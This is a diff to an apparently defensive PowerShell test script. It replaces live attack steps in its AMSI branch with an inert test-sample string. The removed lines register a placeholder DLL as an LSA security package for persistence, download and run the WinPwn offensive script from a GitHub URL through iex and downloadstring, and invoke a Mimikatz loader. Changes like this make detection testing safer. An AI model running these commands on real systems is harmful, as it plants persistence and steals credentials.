@@ -18,13 +18,7 @@ if ($IOCTest.contains('True')) {
 
 if ($AMSITest.contains('True')) {
     "Will execute AMSI samples"
-    $SecurityPackages = Get-ItemProperty HKLM:\System\CurrentControlSet\Control\Lsa -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages'
-    $SecurityPackagesUpdated = $SecurityPackages
-    $SecurityPackagesUpdated += "#{fake_ssp_dll}"
-    Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value $SecurityPackagesUpdated
-
-    iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
-    mimiload -consoleoutput -noninteractive
+    'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
 
   } else {
     "Will not execute AMSI samples"
